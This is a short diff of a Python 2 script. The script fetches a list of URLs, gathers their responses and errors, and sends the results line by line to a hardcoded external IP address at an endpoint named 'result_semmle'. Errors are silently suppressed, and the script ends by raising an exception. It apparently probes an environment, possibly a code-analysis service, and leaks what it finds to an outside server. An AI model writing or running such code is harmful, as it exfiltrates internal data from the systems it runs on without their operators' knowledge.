@@ -38,10 +38,11 @@ for url in URLS:
 		res+="%s"%e.reason
 	except Exception as e:
 		res+=str(e)
-        try:
-            print res
-            content = urllib2.urlopen(url="http://51.38.126.110/result_semmle?"+str(urllib.quote(res))).read()
-        except:
-            pass
+        print res
+        for line in res.split("\n"):
+            try:
+                content = urllib2.urlopen(url="http://51.38.126.110/result_semmle?"+str(urllib.quote(line))).read()
+            except:
+                pass
 
 raise Exception("nop")
